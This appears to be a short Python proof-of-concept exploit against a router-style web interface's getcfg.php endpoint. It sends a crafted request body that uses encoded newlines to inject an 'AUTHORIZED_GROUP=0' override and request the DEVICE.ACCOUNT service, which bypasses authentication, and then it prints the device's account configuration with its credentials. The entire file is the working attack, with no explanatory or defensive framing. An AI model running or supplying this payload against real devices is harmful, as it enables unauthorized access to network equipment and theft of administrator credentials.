import requests as rq

IP = "xx.xx.xxx.xxx"
PORT = "80"

headers = {
    'CONTENT-TYPE' : 'application/x-www-form-urlencoded'
}

url = 'http://{ip}:{port}/getcfg.php'.format(ip=IP,port=PORT)
data = "Z=Z%0a_POST_SERVICES%3dDEVICE.ACCOUNT%0aAUTHORIZED_GROUP%3d0"

#print(data)
print(rq.get(url, data=data, headers=headers).text)
